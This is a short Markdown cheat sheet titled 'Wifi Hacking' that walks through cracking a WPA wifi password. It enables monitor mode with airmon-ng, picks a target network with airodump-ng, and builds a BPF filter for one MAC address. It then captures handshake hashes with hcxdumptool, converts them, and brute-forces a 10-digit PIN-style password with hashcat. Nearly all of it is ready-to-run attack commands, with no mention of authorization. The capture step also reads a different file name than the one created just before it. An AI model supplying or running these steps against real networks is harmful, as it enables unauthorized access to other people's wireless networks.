# __Wifi Hacking__

## ___Preparation___

---

### ___Check the mode of the wifi card___

```bash
iwconfig
iw dev
```

## ___Get the hash___

---

### ___Enable monitor mode___

```bash
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
sudo airmon-ng start wlan0
iw dev
```

### ___Get the MAC address and Channel to attack___

```bash
sudo airodump-ng -w airmon-ng-file --output-format csv wlan0mon
```

### ___Create a target and add it to .bpf file___

```bash
# Change the MAC addres only
sudo tcpdump -s 65535 -y IEEE802_11_RADIO "wlan addr3 909a4a32c0b3 or wlan addr3 ffffffffffff" -ddd > attack-target.bpf
```

### ___Capture hash using hcxdumptool in .pcapng file___

```bash
# --rds=2 for real time display
sudo hcxdumptool -i wlan0mon -c 5a --bpf=attack.bpf -w new_capture.pcapng
```

> "-c 5a" mean chennel 5, a is 2.4ghz

> You need the "+" in all or at least below "3" or "P" .  3 if when a device connects

### ___Enable NetworkManager___

```bash
sudo systemctl start NetworkManager.service
sudo systemctl start wpa_supplicant.service
sudo airmon-ng stop wlan0mon
iw dev
```

## ___Start cracking___

---

### ___Convert .pcapng to hash22000 format___

_This is for new hashcat versions (~6.4+)_

```bash
sudo hcxpcapngtool -o hash.hc22000 new_capture.pcapng
```

### ___Crack with hashcat___

```bash
# 10 digit password
hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d?d?d
```

## ___Other resources___

---

### ___Mac address database___

<https://standards-oui.ieee.org/oui/oui.txt>

<https://standards-oui.ieee.org/oui/oui.csv>


